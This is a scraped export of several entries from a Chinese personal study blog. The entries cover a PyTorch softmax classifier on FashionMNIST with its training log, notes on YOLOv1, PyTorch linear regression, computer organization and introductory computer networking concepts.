交叉熵损失函数 # 表现为对数损失函数 def Loss(y: torch.Tensor, y_hat: torch.Tensor): # 这里的y是n*1的矩阵，而y_hat是n*j return - torch.log(y_hat.gather(1, y.view(-1, 1))).sum() 定义准确率 def accuracy(y: torch.Tensor, y_hat: torch.Tensor): # 如果某一次模型预测结果与真实结果相同，就返回1，否则返回0 # 用argmax函数获取y_hat中最大项的索引（0~9），与真实结果对比 # 转化为float后加和，取其中的值返回 return (y_hat.argmax(1) == y).float().sum().item() 定义优化算法 和前面一样的\n# 定义优化算法 def sgd(params, lr, batch_size): for param in params: # 学习率就是一个用于控制下降幅度的常数 # 权重和偏移优化 param.data -= lr*param.grad / batch_size 定义数据分批的函数 def data_iter(mnist_test, batch_size): return torch.utils.data.DataLoader(mnist_test, batch_size=batch_size, shuffle=True, num_workers=0) 训练函数 只要获取到了训练好的权重和偏移，就相当于获得了训练好的模型\ndef train(n_epoches: int, lr: float, w_hat: torch.Tensor, b_hat: torch.Tensor, batch: int, data: torch.Tensor) -\u0026gt; torch.Tensor: n_features = len(data) # 一共拟合训练数据n_epoch次 for epoch in range(n_epoches): # 初始化某一次的经验误差，准确率 train_l, ac = 0.0, 0.0 # 随机梯度下降法，将数据分批 for f, lb in data_iter(data, batch): y_hat = net(f, w_hat, b_hat) # 计算当前批次经验损失并与上一批的损失加和 l = Loss(lb, y_hat).sum() train_l += l # 计算准确率 ac += accuracy(lb, y_hat) # 反向求偏导 l.backward() # 反向优化模型 sgd([w_hat, b_hat], lr, batch) w_hat.grad.data.zero_() b_hat.grad.data.zero_() # 将误差总和，准确率总和除以训练样本容量 train_l /= n_features ac /= n_features print(f\u0026#34;epoch {epoch}, loss:{train_l}, accuracy:{ac}\u0026#34;) print(f\u0026#34;hat weight:{w_hat}\u0026#34;) print(f\u0026#34;hat bias:{b_hat}\u0026#34;) return w_hat, b_hat 测试训练成果 def test(test_iter: torch.Tensor, w: torch.Tensor, b: torch.Tensor): ac = 0.0 batch_size = len(test_iter) for f, lb in data_iter(test_iter, batch_size): y_hypo = net(f, w, b) ac += accuracy(lb, y_hypo) ac /= batch_size print(f\u0026#34;test accuracy:{ac}\u0026#34;) 开始训练 def main(): batch_size = 256 # 得到的是训练组和测试组 # 用训练组来训练模型，用测试组来测试模型准确度 train_iter = torchvision.datasets.FashionMNIST(root=\u0026#39;~/Datasets/FashionMNIST\u0026#39;, train=True, download=False, transform=transforms.ToTensor()) test_iter = torchvision.datasets.FashionMNIST(root=\u0026#39;~/Datasets/FashionMNIST\u0026#39;, train=False, download=False, transform=transforms.ToTensor()) # 行数*列数，是一张图的像素总量 num_inputs = 28*28 # 标注问题，只有0~9一共10个标注 num_outputs = 10 # 初始化权重与偏移 w = torch.tensor(np.random.normal( 0, 0.01, (num_inputs, num_outputs)), dtype=torch.float, requires_grad=True) b = torch.zeros(num_outputs, dtype=torch.float, requires_grad=True) # 训练模型 w, b = train(10, 0.03, w, b, batch_size, train_iter) # 测试模型 test(test_iter, w, b) if __name__ == \u0026#34;__main__\u0026#34;: main() 训练结果 epoch 0, loss:1.0356025695800781, accuracy:0.69585 epoch 1, loss:0.709172248840332, accuracy:0.7767 epoch 2, loss:0.6368897557258606, accuracy:0.7977333333333333 epoch 3, loss:0.597575306892395, accuracy:0.80825 epoch 4, loss:0.5720041394233704, accuracy:0.8157666666666666 epoch 5, loss:0.5530234575271606, accuracy:0.8211666666666667 epoch 6, loss:0.5385252833366394, accuracy:0.8246333333333333 epoch 7, loss:0.5267878770828247, accuracy:0.8280666666666666 epoch 8, loss:0.5172721743583679, accuracy:0.8301 epoch 9, loss:0.5093177556991577, accuracy:0.8327666666666667 hat weight:tensor([[ 3.6310e-03, -7.5329e-03, 3.7053e-03, ..., 3.1249e-02, -2.1517e-03, 2.2466e-03], [ 2.1203e-02, -8.7482e-03, 1.5493e-02, ..., -2.7951e-03, -6.2426e-03, 2.5957e-02], [ 1.7465e-02, 1.5385e-03, -2.2081e-03, ..., 1.4364e-02, 2.8634e-03, -2.0297e-02], ..., [ 9.7792e-05, 3.9122e-03, 2.1818e-02, ..., -1.7938e-02, 2.0017e-02, -7.0280e-03], [-2.0205e-04, -1.5446e-02, 3.1180e-03, ..., -1.0438e-02, -2.1133e-03, -6.5218e-03], [-3.9553e-03, 4.7967e-03, -1.0672e-02, ..., -4.2892e-03, -4.3317e-04, -1.1061e-02]], requires_grad=True) hat bias:tensor([ 0.0898, -0.0810, -0.0846, 0.0271, -0.4667, 1.0832, 0.2318, -0.0801, -0.2585, -0.4609], requires_grad=True) test accuracy:0.8204 ","date":"2022年11月16日","permalink":"https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/softmax/softmax%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/","section":"principle","summary":"True friendship is like sound health; the value of it is seldom known until it is lost. — Charles Caleb Colton softmax 简单实现 需要导入的库 定义需要的函数 定义模型函数 定义交叉熵损失函数 定义准确率 定义优化算法 定义数据分批的函数 训","tags":["deeplearning","softmax","completion"],"title":"softmax简单实现"},{"categories":["principle"],"contents":" Coming together is a beginning; keeping together is progress; working together is success. — Edward Everett Hale\nYOLOv1 介绍 检测原理 神经网络设计 训练 激活函数 loss 函数 过拟合处理 介绍 You Only Look Once:Unified, Real-Time Object Detectio\nyolo 是统一、单阶段的，快速、即时的目标检测模型\n相较于其他的模型（例如 CNN）\n它的最大特点是快 同时是“全局性”（globally）检测，更有整体观 能够提取出物体的抽象特征，便于迁移到艺术品等的检测 检测原理 yolo 将整个图片分成 S*S 个格子（grid），然后对其分别做两个检测\n物体框（bounding box），包括五个维度：x,y(中心点坐标),w,h(宽和长),C(置信度) 其中的置信度指的是这个框内存在物体的概率的可信度，用存在物体的概率乘以 IOU（预测事实与真正事实的交集除以预测事实与真正事实的并集） 类别检测（conditional class），每一个小方块预测一个类别，表示这个小方块内的物体框如果有物体那这个物体的类别是什么 因此，某方块内存在某类别的物体的置信度是： yolo 输入张量的维度为 S*S*(B*5+c)，在 yolov1 中 B 往往是 1\n所以，yolo 的基本思想是：在这个区域有物体，而且这个物体是这个类别的，所以在这个区域有这个类别的物体\n神经网络设计 yolov1 的主体是卷积神经网络，模型大小取决于卷积神经网络的层次\n对原图多次卷积、池化（最大池化）后接两个全连接层\n通过卷积提取出原图的多个局部特征，通过池化降噪，然后经过全连接层整合特征并引入非线性后得到结果\n训练 激活函数 采用 leakyReLU 函数 loss 函数 过拟合处理 ","date":"2022年11月16日","permalink":"https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/yolo/yolov1/","section":"principle","summary":"Coming together is a beginning; keeping together is progress; working together is success. — Edward Everett Hale YOLOv1 介绍 检测原理 神经网络设计 训练 激活函数 loss 函数 过拟合处理 介绍 You Only Look Once:Unified, Real-Time Object Detectio yolo 是统一、单阶段的，快速、即时的目标检测模型","tags":["pwn"],"title":"yolov1"},{"categories":["principle","softmax"],"contents":" It always seems impossible until it\u0026rsquo;s done. — Nelson Mandela\n使用 torchvision 库\n图像识别 从 MNIST 获取数据 定义画图函数 将数据集里的 labels 映射为字符串 打印 features 和 labels import matplotlib.pyplot as plt import numpy as np import torchvision import torchvision.transforms as transforms 从 MNIST 获取数据 # 获得的是Mnist中标注过的数据 trained_set = torchvision.datasets.FashionMNIST(root=\u0026#39;~/Datasets/FashionMNIST\u0026#39;, train=True, download=False, transform=transforms.ToTensor()) 定义画图函数 # 定义画图函数 def draw(features, labels): # 设置图表大小 plt.rcParams[\u0026#39;figure.figsize\u0026#39;] = (8.0, 6.0) # 创建子图 _, axs = plt.subplots(10, len(features) // 10) # 调整间距 plt.subplots_adjust(left=None, bottom=None, right=None, top=None, wspace=None, hspace=2) assert isinstance(axs, np.ndarray) # 类型断言 # 将多维数组转化为一维数组 axs = axs.reshape((1, -1))[0] # print(axs) # 对每一个子图单独设置它们的像素值和标签 for ax, img, lbl in zip(axs, features, labels): # 像素值放置 ax.imshow((img.view((28, 28))).numpy()) # 设置标签 ax.set_title(lbl) # 取消显示轴 ax.axes.get_xaxis().set_visible(False) ax.axes.get_yaxis().set_visible(False) plt.show() 将数据集里的 labels 映射为字符串 # 设置每一个数字的映射值 def get_fashion_mnist_labels(labels): text_labels = [\u0026#39;t-shirt\u0026#39;, \u0026#39;trouser\u0026#39;, \u0026#39;pullover\u0026#39;, \u0026#39;dress\u0026#39;, \u0026#39;coat\u0026#39;, \u0026#39;sandal\u0026#39;, \u0026#39;shirt\u0026#39;, \u0026#39;sneaker\u0026#39;, \u0026#39;bag\u0026#39;, \u0026#39;ankle boot\u0026#39;] return [text_labels[int(i)] for i in labels] 打印 features 和 labels # 把训练好的数据连同每一张图对应的识别值打印出来 draw([trained_set[i][0] for i in range(30)], get_fashion_mnist_labels([trained_set[i][1] for i in range(30)])) ","date":"2022年11月16日","permalink":"https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/softmax/%E5%9B%BE%E5%83%8F%E8%AF%86%E5%88%ABintro/","section":"principle","summary":"It always seems impossible until it\u0026rsquo;s done. — Nelson Mandela 使用 torchvision 库 图像识别 从 MNIST 获取数据 定义画图函数 将数据集里的 labels 映射为字符串 打印 features 和 labels import matplotlib.pyplot as plt import numpy as np import torchvision import torchvision.transforms as transforms 从 MNIST 获取数据 # 获得的是Mn","tags":["deeplearning","图像识别","intro"],"title":"图像识别intro"},{"categories":["principle","SimpleImplement"],"contents":" You\u0026rsquo;re not obligated to win. You\u0026rsquo;re obligated to keep trying to do the best you can every day. — Marian Wright Edelman\n我们之前的程序有时兼顾了太多的细节，pytorch的库里有许多优雅而方便的方法，我们可以利用它们来优化我们的程序\n线性回归优化实现-利用pytorch 重构函数 定义数据（features和labels） 定义Loss函数 定义模型 定义优化函数 定义训练函数 开始训练 重构函数 定义数据（features和labels） def data_iter(features: torch.tensor, batch_size:int, labels:torch.tensor): # 原本的实现 # total_size = len(features) # indexes = list(range(0,total_size)) # random.shuffle(indexes) # for i in range(0, total_size, batch_size): # choice = torch.tensor(indexes[i:min(i+batch_size, total_size)]) # yield features.index_select(0,choice), labels.index_select(0,choice) # 优化的实现 # import torch.utils.data as Data # 先组合特征值和真值 dataSet = Data.TensorDataset(features, labels) # 将数据分批 # 返回一个迭代器 return Data.DataLoader(dataSet, batch_size, True) 定义Loss函数 # 原本的实现 # 定义Loss函数 # def Loss(y_hat, y): # # 1/2*(y_hat - y)^2 # return (y_hat - y.view(y_hat.size()))**2/2 # 优化的实现 # nn中内置了均方损失函数 Loss = nn.MSELoss() 定义模型 # 原本的实现方法 # 定义模型（函数）,此处的模型是最基本的矩阵乘法 # def linMul(x,w,b): # return torch.mm(x,w) + b #第二种写法 # 这种写法的好处是使多层神经网络清晰明了 # class LinearNet(nn.Module): # def __init__(self, n_feature:int) -\u0026gt; None: # super().__init__() # # 定义输入参数个数与输出参数个数，bias默认自动生成 # self.linear = nn.Linear(n_feature, 1) # # 向前传播函数（线性函数） # def forward(self, x): # # 获取判断值 # y = self.linear(x) # return y # 第三种写法 def LinearNet(n_feature): # Sequential是一个容器，可以容纳多层模型 return nn.Sequential( # 有序字典 OrderedDict([ (\u0026#39;linear\u0026#39;, nn.Linear(n_feature, 1)) # 还可以传入其他层 ]) ) # 或者直接 return nn.Sequential(nn.Linear(n_feature,1)) # 可以查看容器中所有可学习参数（w\u0026amp;b） # net = LinearNet(2) # for param in net.parameters(): # print(param) net = LinearNet(2) 定义优化函数 # 原本的实现 # 定义优化算法 # def sgd(params, lr, batch_size): # for param in params: # param.data -= lr*param.grad / batch_size #优化的实现 # 会直接对net中的训练参数优化 # 设置学习率为0.03 optimizer = torch.optim.SGD(net.parameters(), lr=0.03) 定义训练函数 # 定义训练函数 # def train(num_epoches, lr, features, batch_size, labels, hat_w, hat_b, true_w, true_b): # for epoch in range(num_epoches): # for x,y in data_iter(features, batch_size, labels): # lab_tmp = linMul(x, hat_w.T, hat_b) # # print(lab_tmp) # l = Loss(lab_tmp, y).sum() # l.backward() # sgd([hat_w, hat_b], lr, batch_size) # hat_w.grad.data.zero_() # hat_b.grad.data.zero_() # train_l = Loss(linMul(features, hat_w.T, hat_b), labels).sum() # print(f\u0026#34;epoch {epoch}, loss:{train_l}\u0026#34;) # print(f\u0026#34;true weight:{true_w}, hat weight:{hat_w}\u0026#34;) # print(f\u0026#34;true bias:{true_b}, hat bias:{hat_b}\u0026#34;) def train(num_epoch, features: torch.tensor, batch_size:int, labels:torch.tensor): for epoch in range(num_epoch): for x,y in data_iter(features, batch_size, labels): # 获取模拟结果 output = net(x) # 计算损失 l = Loss(output, y.view(output.size())) # 梯度清零 optimizer.zero_grad() # 反向求导（求偏导） # 这样可以求出使Loss下降最快的梯度 l.backward() # 优化 optimizer.step() print(f\u0026#34;epoch {epoch}, loss:{l}\u0026#34;) 开始训练 def main(): # 先定义真正的w\u0026amp;b，还有应该得到的结果 true_w = maker(10,2,False) true_b = maker(5,1,False) print(f\u0026#34;true weight:{true_w}, true bias:{true_b}\u0026#34;) #定义1000个数据(特征值) features = torch.randn((1000, 2)) print(f\u0026#34;features:{features}\u0026#34;) # 定义真值 labels = torch.mm(features,true_w.T) + true_b # net是一张网，包含了神经网络各层的训练模型 # 初始化模型参数 # 不必再使用自定义的hat_w和hat_b，而是直接内置到模型中 nn.init.normal_(net[0].weight, 0, 0.01) nn.init.constant_(net[0].bias, 0) # 定义迭代次数 num_epoches = 10 # train(num_epoches, lr, features, 10, labels, hat_w, hat_b, true_w, true_b) train(num_epoches, features, 10, labels) print(f\u0026#34;true weight:{true_w}, hat weight:{net[0].weight}\u0026#34;) print(f\u0026#34;true bias:{true_b}, hat bias:{net[0].bias}\u0026#34;) ","date":"2022年11月16日","permalink":"https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/simpleimplement/linearregression_optimized/","section":"principle","summary":"You\u0026rsquo;re not obligated to win. You\u0026rsquo;re obligated to keep trying to do the best you can every day. — Marian Wright Edelman 我们之前的程序有时兼顾了太多的细节，pytorch的库里有许多优雅而方便的方法，我们可以利用它们来优化我们","tags":["deeplearning","线性回归","pytorch","completion"],"title":"线性回归优化实现-利用pytorch"},{"categories":["principle","计算机网络"],"contents":" Computers are like bikinis. They save people a lot of guesswork. — Sam Ewing\n本笔记是笔者在阅读计算机科学导论时的随记\n计算机网络和因特网_笔记 网络 网络：是一系列可用于通信的设备相互连接构成的 设备： 主机（终端） 连接设备 局域网（LAN） 广域网（WAN） 点对点广域网 交换广域网 互联网络（internet ，小写） 因特网（Internet，大写） 骨干网 供应商网络 客户网络 骨干网和供应商网络并称为因特网服务供应商 骨干网被称为国际因特网服务供应商 供应商网络被称为国内或地域性因特网服务供应商 Computer Organization CPU(central processing unit) ALU(arithmetic logic unit) control unit a set of registers Cache memory contains a copy of a portion of main memory accelerate the process procedure main memory address space Data(organized as words) I/O(input/output) subsystem input output catagories adress connected by bus data bus address bus control bus Difference between Router and Switch What are Switches in Computer Network? Features of Switches Types of Switches 网络 网络：是一系列可用于通信的设备相互连接构成的 设备： 主机（终端） 连接设备 路由器：将一个网络与另一个网络相连接\n交换机：讲不同设备连接在一起\n调制调节器：可以改变数据形式\n局域网（LAN） 私有网络 每台主机都有作为这台主机在局域网中唯一定义的一个标识和一个地址 一台主机向另一台主机发送的数据包中包括源主机和目标主机的地址 用交换机（switch）连接所有的主机 广域网（WAN） 地理跨度较 LAN 大得多 WAN 将交换机、路由器（router）或调制调节器之类的连接设备互连 局域网为机构私有，而广域网则由通信公司创建并运营 点对点广域网 @——@\n通过传输媒介（电缆或无线）连接两个通信设备的网络\n交换广域网 至少两个端的网络，交换广域网用于当今全球通信的骨干网，是几个点对点广域网通过交换机（switch）连接产生的结合体\n互联网络（internet ，小写） 两个或多个（LAN\u0026amp;WAN）相互连接时，他们构成一个互联网络（网际网）\n因特网（Internet，大写） 成千上万个互联网络组成因特网\n骨干网 为通信公司拥有 通过网络对等汇点连接 供应商网络 规模较小 付费使用骨干网上的一些服务 与骨干网相连，有时也连接其他供应商网络 客户网络 在边缘 真正使用基于因特网服务的网络 向供应商网络付费得到服务 骨干网和供应商网络并称为因特网服务供应商 骨干网被称为国际因特网服务供应商 供应商网络被称为国内或地域性因特网服务供应商 下面是当时找到的一些参考资料（还有一些笔者自己写的英语笔记，但是是那篇已经忘了），原网址找不到了，如有侵犯作者权益，笔者一定删除\nComputer Organization CPU(central processing unit) ALU(arithmetic logic unit) logic shift arithmetic operations control unit contrl the operation of CPU\ncomputer divided by instructions\nCISC(complex instruction set computers)\nprogrammer\u0026rsquo;s works are easier a large set of instructions RISC(reduced instruction set computers)\nprogrammer\u0026rsquo;s works are more difficult simple instructions the process of computer program\nways of processing\npipelining\nParallel processing\nSISD SIMD MISD(JUST CONCEPT) MIMD a cycle\nfetch decode execute a set of registers Data registers\nInstruction registers\ninstruction set\nopcode operand Program counter\nCache memory contains a copy of a portion of main memory accelerate the process procedure CPU checks the cache\nif it\u0026rsquo;s in cache ,get it if not, cache will go get it main memory address space adress Data(organized as words) RAM(random access memory)\nSRAM(static)\nfast expensive DRAM(dynamic)\nslow inexpensive ROM(read-only) memory\nPROM(cannot erase) EPROM(can erase by ultraviolet light) EEPROM(can erase by electronic impulses) I/O(input/output) subsystem input hard disk USB CD/DVD keyboard output monitor printer catagories Nonstorage devices\nStorage devices\nmagnetic optical adress isolated I/O method memory-mapped I/O method connected by bus data bus address bus control bus Difference between Router and Switch Router and Switch are both network connecting devices. Router works at network layer and is responsibe to find the shortest path for a packet whereas Switch connects various devices in a network. Router connects devices across multiple networks.\nFollowing are the important differences between Router and Switch.\nSr. No. Key Router Switch 1 Objective Router main objective is to connect various networks. Switch main objective is to connect various devices in a network. 2 Layer Router works in Network Layer. Switch works in Data Link Layer. 3 Usage Router is used in LAN and MAN. Switch is used only in LAN. 4 Data Format Router sends data in form of packets. Switch sends data in form of packets and frames. 5 Mode of Transmission Router follows duplex mode of transmission. Switch also follows duplex mode of transmission. 6 Collision Less collision in case of Router. In full duplex mode, no collision happens in switch too. 7 NAT Compatability Compatible with NAT. Not compatible with NAT. 8 Type Routing type is Adaptive and Non-adaptive routing. Switching type is Circuit, Packet and Message switching. What are Switches in Computer Network? A switch has many ports, to which computers are plugged in. When a data frame arrives at any port of a network switch, it examines the destination address, performs necessary checks and sends the frame to the corresponding device(s).It supports unicast, multicast as well as broadcast communications.\nFeatures of Switches A switch operates in the layer 2, i.e. data link layer of the OSI model. It is an intelligent network device that can be conceived as a multiport network bridge. It uses MAC addresses (addresses of medium access control sublayer) to send data packets to selected destination ports. It uses packet switching technique to receive and forward data packets from the source to the destination device. It is supports unicast (one-to-one), multicast (one-to-many) and broadcast (one-to-all) communications. Transmission mode is full duplex, i.e. communication in the channel occurs in both the directions at the same time. Due to this, collisions do not occur. Switches are active devices, equipped with network software and network management capabilities. Switches can perform some error checking before forwarding data to the destined port. The number of ports is higher – 24/48. Types of Switches There are variety of switches that can be broadly categorised into 4 types −\nUnmanaged Switch − These are inexpensive switches commonly used in home networks and small businesses. They can be set up by simply plugging in to the network, after which they instantly start operating. When more devices needs to be added, more switches are simply added by this plug and play method. They are referred to as u managed since they do not require to be configured or monitored. Managed Switch − These are costly switches that are used in organisations with large and complex networks, since they can be customized to augment the functionalities of a standard switch. The augmented features may be QoS (Quality of Service) like higher security levels, better precision control and complete network management. Despite their cost, they are preferred in growing organizations due to their scalability and flexibility. Simple Network Management Protocol (SNMP) is used for configuring managed switches. LAN Switch − Local Area Network (LAN) switches connects devices in the internal LAN of an organization. They are also referred as Ethernet switches or data switches. These switches are particularly helpful in reducing network congestion or bottlenecks. They allocate bandwidth in a manner so that there is no overlapping of data packets in a network. PoE Switch − Power over Ethernet (PoE) switches are used in PoE Gogabit Ethernets. PoE technology combine data and power transmission over the same cable so that devices connected to it can receive both electricity as well as data over the same line. PoE switches offer greater flexibility and simplifies the cabling connections ","date":"2022年11月16日","permalink":"https://peterliuzhi.top/principle/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%AF%BC%E8%AE%BA/","section":"principle","summary":"Computers are like bikinis. They save people a lot of guesswork. — Sam Ewing 本笔记是笔者在阅读计算机科学导论时的随记 计算机网络和因特网_笔记 网络 网络：是一系列可用于通信的设备相互连接构成的 设备： 主机","tags":["计算机网络"],"title":"导论"},{"categories":["principle","计算机网络"],"contents":" Lord, make me an instrument of thy peace. Where there is hatred, let me sow love. — Francis of Assisi\n概述 什么是互联网 什么是协议 边缘部分和核心部分 边缘部分-主机 主机通信方式-C/S：客户-服务器方式 主机通信方式-P2P：对等连接方式 核心部分 电路交换 分组交换 Packet Switching 三种交换方式比较 互联网的结构 互联网的性能 速率-比特 bit 承载能力-带宽 实际数据量-吞吐量 网络延迟-时延 时延带宽积 往返时间 RTT 利用率 非性能指标 分层模型 为什么要分层 计算机网络的分层模型 多路复用和多路分解 OSI 七层模型 一些概念 什么是互联网 计算机网络（简称网络） 由若干结点和连接这些结点的链路组成\n互联网是\n数以亿计的计算设备连接在一起的网络 将各种网络（无数的异构网络）连接在一起的网络 网络把许多计算机连接在一起，而互联网则把许多网络通过路由器连接在一起。与网络相连的计算机常称为主机（host）或者终端系统（end system）\n该如何发送/接收信息，就要用到协议\n什么是协议 协议定义了消息格式、发送和接受消息的顺序、以及发出或收到指定消息之后所采取的行为。\n边缘部分和核心部分 边缘部分 由所有连接在互联网上的主机组成。这部分是用户直接使用的，用来进行通信（传送数据、音频或视频）和资源共享。 核心部分 由大量网络和连接这些网络的路由器组成。这部分是为边缘部分提供服务的（提供连通性和交换） 边缘部分-主机 我们说：“主机 A 和主机 B 进行通信”，实际上是指：“运行在主机 A 上的某个程序和运行在主机 B 上的另一个程序进通信”。由于“进程”就是“运行着的程序”，因此这也就是指：“主机 A 的某个进程和主机 B 上的另一个进程进行通信”，简称为“计算机之间通信”。\n主机通信方式-C/S：客户-服务器方式 客户 (client) 和服务器 (server) 都是指通信中所涉及的两个应用进程。 客户 – 服务器方式所描述的是进程之间服务和被服务的关系。 客户是服务的请求方，服务器是服务的提供方。 客户和服务器间的通信，往往是需要经过互联网的核心部分的 客户程序：\n被用户调用后运行，在通信时主动向远地服务器发起通信（请求服务）。因此，客户程序必须知道服务器程序的地址。 不需要特殊的硬件和很复杂的操作系统。 服务器程序：\n是一种专门用来提供某种服务的程序，可同时处理多个远地或本地客户的请求。 系统启动后即自动调用并一直不断地运行着，被动地等待并接受来自各地的客户的通信请求。因此，服务器程序不需要知道客户程序的地址。 一般需要有强大的硬件和高级的操作系统支持。 客户与服务器的通信关系建立后，通信可以是双向的，客户和服务器都可发送和接收数据。\n客户和服务器本来都指的是计算机进程（软件），但在许多国外文献中，经常也把运行客户程序的机器称为 client（在这种情况下也可把 client 译为“客户机”），把运行服务器程序的机器称为 server。\n主机通信方式-P2P：对等连接方式 对等连接 (peer-to-peer，简写为 P2P) 是指两个主机在通信时并不区分哪一个是服务请求方还是服务提供方。 只要两个主机都运行了对等连接软件 (P2P 软件) ，它们就可以进行平等的、对等连接通信。 可以减轻服务器压力，提高主机资源的利用率。 可能经过核心部分，也可能仅在边缘部分完成。 核心部分 互联网的核心部分由互联的路由器/交换机组成（interconnected routers） 网络中的核心部分要向网络边缘中的大量主机提供连通性，使边缘部分中的任何一个主机都能够向其他主机通信（即传送或接收各种形式的数据）。 在网络核心部分起特殊作用的是路由器 (router)。路由器是实现分组交换 (packet switching) 的关键构件，其任务是转发收到的分组，这是网络核心部分最重要的功能。 主要的通信方式：电路交换（circuit switching）和分组交换（packet switching，用于互联网中）\n电路交换 通过建立专用链路来实现通信。譬如打电话，将一个电话和其他所有电话都建立链路是不可能的。因此在打电话之前使 用电话交换机将这些电话连接起来，为两者建立专用链路。\n这种必须经过“建立连接（占用通信资源）→ 通话（一直占用通信资源）→ 释放连接（归还通信资源）”三个步骤的交换方式称为电路交换。\n优点：\n资源专用，无共享，保证了性能和体验 传统电话网络中采用。 缺点： 电路交换是不适合互联网的，因为互联网具有突发性，通信量可能突然增大，导致我们很难去涉及电路的容量（若设计通信链路时按照峰值的数据量设计，则在平时通信链路的利用率很低）。\n当使用电路交换来传送计算机数据时，其线路的传输效率往往很低。这是因为计算机数据是突发式地出现在传输线路上的，因此线路上真正用来传送数据的时间往往不到 10%甚至 1%。已被用户占用的通信线路资源在绝大部分时间里都是空闲的。\n分组交换 Packet Switching 分组交换则采用存储转发技术\n我们把要发送的整块数据称为一个报文(message)，把较长的报文划分成为一个个更小的等长数据段，每一个数据段前面，加上一些由必要的控制信息组成的首部(header)后，就构成了一个分组(packet)。分组又称为“包”，而分组的首部也可称为“包头”。 因此，在分组交换中没有专用的链路，相当于把所有信息都切分并打包成一个个包，再同一发送给接收方\n分组交换的过程： 位于网络边缘的主机和位于网络核心部分的路由器都是计算机，但它们的作用却很不一样。 主机是为用户进行信息处理的，并且可以和其他主机通过网络交换信息。 路由器则是用来转发分组的，即进行分组交换的。路由器收到一个分组，先暂时存储一下，检查其首部，查找转发表，按照首部中的目的地址，找到合适的接口转发出去，把分组交给下一个路由器。这样一步一步地（有时会经过几十个不同的路由器）以存储转发的方式，把分组交付最终的目的主机。 各路由器之间必须经常交换彼此掌握的路由信息，以便创建和动态维护路由器中的转发表，使得转发表能够在整个网络拓扑发生变化时及时更新。\n分组交换的缺点：\n分组在各路由器存储转发时需要排队，这就会造成一定的时延。分组交换并没有“专用”链路，因此可能发生拥塞 首部的开销 如果路由的缓存已满，则分组可能会被丢弃，信息可能会丢失，造成丢包 分组交换的优点： 三种交换方式比较 三种交换方式在数据传送阶段的主要特点：\n电路交换—整个报文的比特流连续地从源点直达终点，好像在一个管道中传送。 报文交换—整个报文先传送到相邻结点，全部存储下来后查找转发表，转发到下一个结点。 分组交换—单个分组（这只是整个报文的一部分）传送到相邻结点，存储下来后查找转发表，转发到下一个结点 因为用户不是时刻在进行交互，所以分组交换可以更好地将计算机的资源利用起来\n互联网的结构 端系统/主机，通过连接 access ISP（Internet Service Providers）接入互联网（小区、公司、或大学，都可视为 access ISP 的例子），Access ISP 也需要互相连接，由此任意的两个主机才可以互相发送分组，由此构成非常复杂的互联网 – network of networks\n不可能将每一个 access net 都通过链路连接起来=》使用路由器交换，构建全球 ISP 但是可能会有不同公司构建 ISP，形成竞争=》使用网络交换节点 IXP 在 ISP 之间交互 同一个区域属于一层=》使用 regional net 区域网络将同一区域的请求一起上传 之后 Google 等网络服务供应商就可以在这个网络上构建自己的服务 互联网的性能 速率-比特 bit 比特（bit）是计算机中数据量的单位，也是信息论中使用的信息量的单位。 比特（bit）来源于 binary digit，意思是一个“二进制数字”，因此一个比特就是二进制数字中的一个 1 或 0。 速率是计算机网络中最重要的一个性能指标，指的是数据的传送速率，它也称为数据率 (data rate) 或比特率 (bit rate)。 速率的单位是 bit/s，或 kbit/s、Mbit/s、 Gbit/s 等。速率往往是指额定速率或标称速率，非实际运行速率。 承载能力-带宽 两种不同意义：\n“带宽”(bandwidth) 本来是指信号具有的频带宽度，其单位是赫（或千赫、兆赫、吉赫等）。 在计算机网络中，带宽用来表示网络中某通道传送数据的能力。表示在单位时间内网络中的某信道所能通过的“最高数据率”。单位是 bit/s，即 “比特每秒”。 在“带宽”的上述两种表述中，前者为频域称谓，而后者为时域称谓，其本质是相同的。也就是说，一条通信链路的“带宽”越宽，其所能传输的“最高数据率”也越高。\n实际数据量-吞吐量 吞吐量 (throughput) 表示在单位时间内通过某个网络（或信道、接口）的数据量。 吞吐量更经常地用于对现实世界中的网络的一种测量，以便知道实际上到底有多少数据量能够通过网络。 吞吐量受网络的带宽或网络的额定速率的限制。 网络延迟-时延 时延 (delay 或 latency) 是指数据（一个报文或分组，甚至比特）从网络（或链路）的一端传送到另一端所需的时间。有时也称为延迟或迟延。\n网络中的时延由以下几个不同的部分组成：\n发送时延（Transmission delay）：主机或路由器发送数据帧所需要的时间\r传播时延（Propagation delay）：电磁波在信道中传播一定的距离需要花费的时间（1000 km 长的光纤线路产生的传播时延大约为 5 ms）\r处理时延（Processing delay）：主机或路由器在收到分组时要花费一定的时间进行处理 排队时延（Queueing delay）分组在经过网络传输时，要经过许多路由器。但分组在进入路由器后要先在输入队列中排队等待处理（当网络的通信量很大时会发生队列溢出，使分组丢失，这相当于排队时延为无穷大） 对于高速网络链路，我们提高的仅仅是数据的发送速率而不是比特在链路上的传播速率，提高链路带宽减小了数据的发送时延。传播速率由链路的物理介质决定，例如将铜导线换成光纤。 时延带宽积 链路的时延带宽积又称为以比特为单位的链路长度。\n往返时间 RTT 往返时间 RTT (round-trip time) 表示从发送方发送数据开始，到发送方收到来自接收方的确认，总共经历的时间。\n互联网上的信息不仅仅单方向传输，而是双向交互的。因此，有时很需要知道双向交互一次所需的时间。 在互联网中，往返时间还包括各中间结点的处理时延、排队时延以及转发数据时的发送时延。 当使用卫星通信时，往返时间 RTT 相对较长，是很重要的一个性能指标。\n利用率 分为信道利用率和网络利用率。 信道利用率指出某信道有百分之几的时间是被利用的（有数据通过），完全空闲的信道的利用率是零。\n网络利用率则是全网络的信道利用率的加权平均值。 信道利用率并非越高越好。当某信道的利用率增大时，会导致分组排队，该信道引起的时延也就迅速增加。（当高速公路上的车流量很大时，由于在公路上的某些地方会出现堵塞，因此行车所需的时间就会变长）\r令 D0 表示网络空闲时的时延，D 表示网络当前的时延，那么在适当的假定条件下，可以用下面的简单公式(1-5)来表示 D，D0 和利用率 U 之间的关系： 非性能指标 一些非性能特征也很重要。它们与前面介绍的性能指标有很大的关系。主要包括：\n费用 可靠性 质量 可扩展性和可升级性 标准化 易于管理、可维护性 